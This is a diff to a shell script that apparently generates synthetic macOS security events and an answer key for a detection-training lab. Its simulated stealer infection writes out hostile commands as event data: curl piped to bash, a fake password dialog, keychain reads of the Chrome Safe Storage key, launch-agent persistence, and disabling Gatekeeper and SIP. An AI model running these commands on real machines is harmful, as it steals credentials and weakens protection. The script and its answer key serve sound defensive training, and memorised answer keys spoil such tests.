@@ -218,12 +218,15 @@ ENV_JSON='["HOME=/Users/learner","LANG=C.UTF-8","LOGNAME=learner","PATH=/usr/loc
 FDS_tty='[{"fd":0,"fdtype":1},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
 FDS_pipe='[{"fd":0,"fdtype":6,"pipe":{"pipe_id":100231}},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
 EXEC_SCRIPT=''   # set before ev_exec for a script run through its interpreter; reset by it
+EXEC_IDS=''      # "ruid euid rgid egid" set before ev_exec for a setuid program; reset by it
 
 # ev_exec SECONDS handle path kind signing_id team_id cwd fds(tty|pipe) ARGS...
 #   The event carries the process before the exec and, as its target, the process after it.
 ev_exec() {
   local sec=$1 h=$2 before args cwd script fds
   proc_obj "$h"; before=$PROC_OUT
+  # A setuid program changes the ids at the exec: only the new image runs with them.
+  if [ -n "$EXEC_IDS" ]; then set_ids "$h" $EXEC_IDS; EXEC_IDS=''; fi
   P_PATH[h]=$3; P_KIND[h]=$4; P_SID[h]=$5; P_TEAM[h]=$6
   P_PV[h]=$((P_PV[h] + 1))
   json_esc "$7"; cwd=$JSON_OUT
@@ -275,6 +278,20 @@ ev_rename() {
   emit "$1" "$2" rename "{\"destination\":{\"existing_file\":$t},\"destination_type\":0,\"source\":$f}"
 }
 
+# ev_btm_add SECONDS item_url app_url item_type executable_path [app_handle]
+#   backgroundtaskmanagementd (BTMD) reports a launch item registered; smd (SMD) is the XPC caller that asked for it.
+#   item_type: 0 user item, 1 app, 2 login item, 3 launch agent, 4 launch daemon. Empty app_url or path: null.
+ev_btm_add() {
+  local iu au ex app=null apptok=null itok inst
+  json_opt "$2"; iu=$JSON_OUT
+  json_opt "$3"; au=$JSON_OUT
+  json_opt "$5"; ex=$JSON_OUT
+  if [ -n "${6:-}" ]; then proc_obj "$6"; app=$PROC_OUT; token "$6"; apptok=$JSON_OUT; fi
+  proc_obj "$SMD"; inst=$PROC_OUT
+  token "$SMD"; itok=$JSON_OUT
+  emit "$1" "$BTMD" btm_launch_item_add "{\"app_token\":$apptok,\"executable_path\":$ex,\"instigator_token\":$itok,\"app\":$app,\"instigator\":$inst,\"item\":{\"uid\":$USER_UID,\"item_url\":$iu,\"app_url\":$au,\"legacy\":$([ "$4" = 3 ] || [ "$4" = 4 ] && echo true || echo false),\"item_type\":$4,\"managed\":false}}"
+}
+
 # answer step rule severity queue marker note: one row of the answer key.
 answer() {
   printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$@" >&4
@@ -284,18 +301,188 @@ answer_header() {
 }
 
 # ---- the synthetic story ----------------------------------------------------------------------------------------
+# sec_plus SECONDS MILLISECONDS: a later time, as seconds with three decimals, in SEC_OUT.
+sec_plus() {
+  to_ms "$1"
+  local t=$((MS + $2))
+  printf -v SEC_OUT '%d.%03d' $((t / 1000)) $((t % 1000))
+}
+
+CWD=/Users/learner
+# run_as SECONDS parent pid pv path kind signing_id team_id ARGS...: the parent forks a child that execs the program
+#   100 ms later and exits 300 ms after the fork. The child's handle is in LAST.
+run_as() {
+  local sec=$1 parent=$2 pid=$3 pv=$4 path=$5 kind=$6 sid=$7 team=$8 c t1 t2
+  shift 8
+  ev_fork "$sec" "$parent" "$pid" "$pv"; c=$LAST
+  sec_plus "$sec" 100; t1=$SEC_OUT
+  sec_plus "$sec" 300; t2=$SEC_OUT
+  ev_exec "$t1" "$c" "$path" "$kind" "$sid" "$team" "$CWD" tty "$@"
+  ev_exit "$t2" "$c"
+  LAST=$c
+}
+# run SECONDS parent pid pv path ARGS...: run_as for an Apple program (signing ID com.apple.<name>).
+run() {
+  local sec=$1 parent=$2 pid=$3 pv=$4 path=$5
+  shift 5
+  run_as "$sec" "$parent" "$pid" "$pv" "$path" platform "com.apple.${path##*/}" '' "$@"
+}
+
+# The story (seconds after 10:00:00): `learner` downloads a fake installer and runs its install script, which drops
+# a stealer agent; the agent fakes a password prompt, reads the keychain, stages what it found and makes itself
+# persistent. Around it: other things the rules notice, some of them ordinary.
+#    1  zsh: curl -o /tmp/lab/Installer.dmg; 3: xattr -d com.apple.quarantine on it
+#    5  curl ... install.sh | bash -s; the piped bash runs whoami (in chain), base64 -d (the agent's binary),
+#       then the agent: ad-hoc signed, in a hidden folder in Application Support
+#    8..22  the agent: osascript fake password prompt, dscl -authonly, security for "Chrome Safe Storage" and for a
+#       web password, osascript running a script file in /tmp, ditto staging in /tmp, tee writing a launch agent plist
+#       (with its btm event: runs /bin/sh), launchctl bootstrap, cp writing a second plist nothing registers
+#    2, 30  Monitor.app (team-signed) runs ps (an Apple setuid tool) and a helper from /var/folders: context only
+#   25  Lab Notes.app runs /bin/sh -c
+#   33..44  zsh: zip in Documents, a setuid helper (euid 0), an attribute-only keychain lookup (context), spctl
+#       --master-disable, csrutil disable, networksetup -setwebproxy, an unsigned updater in /Users/Shared,
+#       (sleep 600 &) which ends up under launchd
+#   45  launchd starts a vendor daemon that runs as root with the user's effective id: dropped privileges, context
+#   46  a standalone launch agent for an updater app, no process tied to it
+#   50..53  a second shell runs sw_vers, uname -a, system_profiler: a recon burst
 synthetic_story() {
   answer_header
-  local LAUNCHD TERMINAL LOGIN ZSH c
+  local LAUNCHD TERMINAL LOGIN ZSH MONITOR NOTES TERMINAL2 ZSH2 SHELL2 bash curl agent sub sl daemon c
+  local LAB=/private/tmp/lab
+  local SUPPORT='/Users/learner/Library/Application Support/.syncd'
+  local AGENTS=/Users/learner/Library/LaunchAgents
   new_proc LAUNCHD 1 1021 /sbin/launchd platform com.apple.launchd '' '' -3600 0 0
+  new_proc BTMD 770 1730 /System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Versions/A/Resources/backgroundtaskmanagementd platform com.apple.backgroundtaskmanagementd '' "$LAUNCHD" -3590 0 0
+  new_proc SMD 560 1390 /usr/libexec/smd platform com.apple.xpc.smd '' "$LAUNCHD" -3590 0 0
   new_proc TERMINAL 6100 8100 /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal platform com.apple.Terminal '' "$LAUNCHD" -3000
   new_proc LOGIN 6120 8120 /usr/bin/login platform com.apple.login '' "$TERMINAL" -2990
   new_proc ZSH 6130 8130 /bin/zsh platform com.apple.zsh '' "$LOGIN" -2980
   P_RESP[ZSH]=$TERMINAL
+  new_proc MONITOR 5200 5201 /Applications/Monitor.app/Contents/MacOS/Monitor team com.example.monitor LAB0AAAA01 "$LAUNCHD" -7200
+  new_proc NOTES 5300 5301 '/Applications/Lab Notes.app/Contents/MacOS/Lab Notes' team com.example.labnotes LAB0BBBB02 "$LAUNCHD" -5400
+  new_proc SHELL2 6390 8390 /usr/bin/login platform com.apple.login '' "$TERMINAL" -600
+  new_proc ZSH2 6400 8400 /bin/zsh platform com.apple.zsh '' "$SHELL2" -590
+  P_RESP[ZSH2]=$TERMINAL
 
-  ev_fork 1.0 "$ZSH" 7001 9001; c=$LAST
-  ev_exec 1.1 "$c" /bin/ls platform com.apple.ls '' /Users/learner tty ls -la
-  ev_exit 1.2 "$c"
+  # 1. The download, and its quarantine flag stripped.
+  ev_fork 1.0 "$ZSH" 7001 9001; curl=$LAST
+  ev_exec 1.1 "$curl" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -sL -o /tmp/lab/Installer.dmg https://downloads.example.com/Installer.dmg
+  ev_create 1.4 "$curl" "$LAB/Installer.dmg"
+  ev_exit 1.6 "$curl"
+  answer download download med queued 'https://downloads.example.com' 'curl saved a file to disk: the fake installer arrives.'
+
+  # Monitor.app's routine ps: an Apple setuid tool, so it runs with euid 0. Context only.
+  EXEC_IDS="$USER_UID 0 $USER_GID $USER_GID"
+  run_as 2.0 "$MONITOR" 7200 9200 /bin/ps platform com.apple.ps '' ps -axo pid,comm
+  answer monitor-ps recon low context 'ps -axo' 'A monitoring app lists processes: recon on its own is context, not queued.'
+  answer monitor-ps uid-mismatch low context 'ps -axo' 'ps is setuid root by design: an allow-listed Apple tool, context only.'
+
+  run 3.0 "$ZSH" 7002 9011 /usr/bin/xattr xattr -d com.apple.quarantine /tmp/lab/Installer.dmg
+  answer quarantine quarantine-strip high queued 'com.apple.quarantine' 'Removing the quarantine flag stops Gatekeeper checking the download.'
+
+  # 2. curl ... | bash -s: the install script arrives through a pipe.
+  ev_fork 5.0 "$ZSH" 7003 9021; curl=$LAST
+  ev_fork 5.0 "$ZSH" 7004 9031; bash=$LAST
+  ev_exec 5.1 "$curl" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -fsSL https://example.com/install.sh
+  ev_exec 5.2 "$bash" /bin/bash platform com.apple.bash '' "$CWD" pipe bash -s
+  ev_exit 5.5 "$curl"
+  answer pipe shell-from-pipe med queued 'bash -s' 'bash runs a script piped from curl: no script file on disk to inspect.'
+  run 5.6 "$bash" 7005 9041 /usr/bin/whoami whoami
+  answer pipe-whoami recon low in-chain whoami 'whoami alone is nothing, but it runs under the piped bash, so it is in a flagged chain.'
+  run 6.0 "$bash" 7006 9051 /usr/bin/base64 base64 -d -i /tmp/lab/payload.b64 -o "$SUPPORT/syncd"
+  answer decode payload-decode med queued 'payload.b64' 'base64 -d unpacks the hidden agent binary.'
+
+  # 3. The agent: ad-hoc signed, hidden in Application Support.
+  ev_fork 7.0 "$bash" 7010 9061; agent=$LAST
+  ev_exec 7.1 "$agent" "$SUPPORT/syncd" adhoc syncd-55554944f0be3f1f '' "$CWD" tty syncd --daemon
+  answer agent odd-location-exec high queued 'syncd --daemon' 'An ad-hoc signed program running from a hidden folder in the home folder.'
+  answer agent adhoc low queued 'syncd --daemon' 'Ad-hoc signed: no developer identity. Shown because the process is flagged anyway.'
+  ev_fork 8.0 "$agent" 7011 9071; c=$LAST
+  ev_exec 8.1 "$c" /usr/bin/osascript platform com.apple.osascript '' "$CWD" tty osascript -e 'display dialog "macOS needs your password to install a helper." default answer "" with hidden answer with title "System Settings"'
+  ev_exit 14.0 "$c"
+  answer prompt fake-prompt high queued 'with hidden answer' 'A fake password prompt: the typed text is hidden as dots.'
+  run 14.5 "$agent" 7012 9081 /usr/bin/dscl dscl . -authonly learner hunter2-lab
+  answer prompt-check dscl-authonly high queued '-authonly' 'Checking whether the phished password is right.'
+  run 15.5 "$agent" 7013 9091 /usr/bin/security security find-generic-password -s 'Chrome Safe Storage' -w
+  answer keychain keychain-access high queued 'Chrome Safe Storage' "Printing the key that decrypts the browser's saved passwords and cookies."
+  run 16.5 "$agent" 7014 9101 /usr/bin/security security find-internet-password -s accounts.example.com -w
+  answer keychain-web keychain-access med queued 'accounts.example.com' 'Printing a saved web password.'
+  run 17.5 "$agent" 7015 9111 /usr/bin/osascript osascript /tmp/lab/collect.scpt
+  answer collect osascript-script med queued 'collect.scpt' 'osascript runs a script file from /tmp.'
+  run 18.5 "$agent" 7016 9121 /usr/bin/ditto ditto -c -k --sequesterRsrc /tmp/lab/loot /tmp/lab/loot.zip
+  answer staging archive-staging high queued 'loot.zip' 'Collected files packed into an archive in /tmp, ready to send.'
+
+  # 4. Persistence: tee writes a launch agent plist and the system registers it; launchctl starts it now;
+  #    cp writes a second plist that nothing registers.
+  ev_fork 19.5 "$agent" 7017 9131; c=$LAST
+  ev_exec 19.6 "$c" /usr/bin/tee platform com.apple.tee '' "$CWD" pipe tee "$AGENTS/com.learner.syncd.plist"
+  ev_create 19.7 "$c" "$AGENTS/com.learner.syncd.plist"
+  ev_exit 19.8 "$c"
+  ev_btm_add 20.0 "file://$AGENTS/com.learner.syncd.plist" '' 3 /bin/sh
+  answer persist persistence-item high queued 'tee /Users' 'A launch agent registered that runs a shell: it starts again at every login.'
+  run 21.0 "$agent" 7018 9141 /bin/launchctl launchctl bootstrap gui/502 "$AGENTS/com.learner.syncd.plist"
+  answer persist-load launchctl-load high queued 'launchctl bootstrap' 'launchctl starts the job now instead of at the next login.'
+  ev_fork 22.0 "$agent" 7019 9151; c=$LAST
+  ev_exec 22.1 "$c" /bin/cp platform com.apple.cp '' "$CWD" tty cp /tmp/lab/helper.plist "$AGENTS/com.learner.helper.plist"
+  ev_create 22.2 "$c" "$AGENTS/com.learner.helper.plist"
+  ev_exit 22.3 "$c"
+  answer persist-plist persistence-plist high queued 'com.learner.helper.plist' 'A second launch agent plist written, with no registration event in the capture.'
+
+  # Lab Notes.app runs a shell.
+  run_as 25.0 "$NOTES" 7300 9300 /bin/sh platform com.apple.sh '' sh -c 'echo synced > /tmp/labnotes.log'
+  answer app-shell shell-under-app med queued 'echo synced' 'An app (not a terminal or editor) launched a shell.'
+
+  # Monitor.app runs a team-signed helper from /var/folders: low, context only.
+  run_as 30.0 "$MONITOR" 7201 9210 /private/var/folders/zz/lab0000000000000000000000/T/Monitor/refresh team com.example.monitor.refresh LAB0AAAA01 refresh --background-refresh
+  answer monitor-refresh odd-location-exec low context '--background-refresh' 'A developer-signed helper run from a temporary folder: weak on its own.'
+
+  # 5. More from the shell.
+  run 33.0 "$ZSH" 7020 9161 /usr/bin/zip zip -r /Users/learner/Documents/notes-backup.zip /Users/learner/Documents/notes
+  answer backup archive-staging med queued 'notes-backup.zip' 'An archive made in an ordinary folder: med, look at what was packed.'
+  EXEC_IDS="$USER_UID 0 $USER_GID $USER_GID"
+  run_as 35.0 "$ZSH" 7021 9171 '/Applications/Helper Tool.app/Contents/MacOS/helper' team com.example.helpertool LAB0CCCC03 helper --install-helper
+  answer setuid uid-mismatch high queued '--install-helper' 'A non-Apple program running with root as its effective user: a setuid binary.'
+  run 37.0 "$ZSH" 7022 9181 /usr/bin/security security find-generic-password -s com.learner.notes
+  answer keychain-attr keychain-access low context 'com.learner.notes' 'A keychain lookup that prints no secret: context only.'
+  run 38.0 "$ZSH" 7023 9191 /usr/sbin/spctl spctl --master-disable
+  answer gatekeeper security-setting-change high queued '--master-disable' 'Turning Gatekeeper off.'
+  run 39.0 "$ZSH" 7024 9201 /usr/bin/csrutil csrutil disable
+  answer sip security-setting-change high queued 'csrutil disable' 'Turning System Integrity Protection off (only works from Recovery).'
+  run 40.0 "$ZSH" 7025 9211 /usr/sbin/networksetup networksetup -setwebproxy Wi-Fi 127.0.0.1 8080
+  answer proxy security-setting-change med queued '-setwebproxy' 'Sending web traffic through a proxy someone chose.'
+  run_as 42.0 "$ZSH" 7026 9221 /Users/Shared/Updater/updater unsigned '' '' updater --check
+  answer unsigned unsigned med queued 'updater --check' 'A program with no code signature at all.'
+  answer unsigned odd-location-exec high queued 'updater --check' 'An unsigned program running from /Users/Shared, which every user can write to.'
+
+  # (sleep 600 &): the subshell exits, the sleep ends up under launchd.
+  ev_fork 44.0 "$ZSH" 7027 9231; sub=$LAST
+  ev_fork 44.1 "$sub" 7028 9241; sl=$LAST
+  ev_exec 44.2 "$sl" /bin/sleep platform com.apple.sleep '' "$CWD" tty sleep 600
+  ev_exit 44.4 "$sub"
+  P_PPID[sl]=1; P_PARENT[sl]=$LAUNCHD
+
+  # 6. launchd starts a vendor daemon that runs as root with the user's effective id.
+  ev_fork 45.0 "$LAUNCHD" 7400 9400; daemon=$LAST
+  EXEC_IDS="0 $USER_UID 0 $USER_GID"
+  ev_exec 45.1 "$daemon" /Library/PrivilegedHelperTools/com.example.agent team com.example.agent LAB0DDDD04 / tty /Library/PrivilegedHelperTools/com.example.agent --serve
+  answer drop uid-mismatch low context '--serve' 'Root running with the user'"'"'s effective id: it gave privileges up, which is context, not escalation.'
+
+  # 7. A standalone launch agent for an updater app: no process in the capture is tied to it.
+  ev_btm_add 46.0 'file:///Users/learner/Library/LaunchAgents/com.example.updater.wake.plist' 'file:///Users/learner/Library/Application%20Support/Example/Updater.app/' 3 '/Users/learner/Library/Application Support/Example/Updater.app/Contents/MacOS/Updater'
+  answer updater persistence-item med item 'com.example.updater.wake' 'A launch item with no process in the capture: it gets its own row.'
+
+  # 8. A recon burst: three different tools under one shell within 4 s.
+  run 50.0 "$ZSH2" 7500 9500 /usr/bin/sw_vers sw_vers
+  answer burst recon low burst sw_vers 'Three different discovery tools within a minute under one shell: a recon burst.'
+  run 51.5 "$ZSH2" 7501 9510 /usr/bin/uname uname -a
+  answer burst recon low burst 'uname -a' 'Part of the same burst.'
+  run 53.0 "$ZSH2" 7502 9520 /usr/sbin/system_profiler system_profiler SPHardwareDataType
+  answer burst recon low burst system_profiler 'Part of the same burst.'
+
+  ev_exit 55.0 "$daemon"
+  ev_exit 60.0 "$bash"
+  ev_exit 70.0 "$sl"
+  answer orphan orphaned low queued 'sleep 600' 'Its parent exited, so it now sits under launchd: the double fork that detaches a process.'
 }
 
 # ---- command line -----------------------------------------------------------------------------------------------
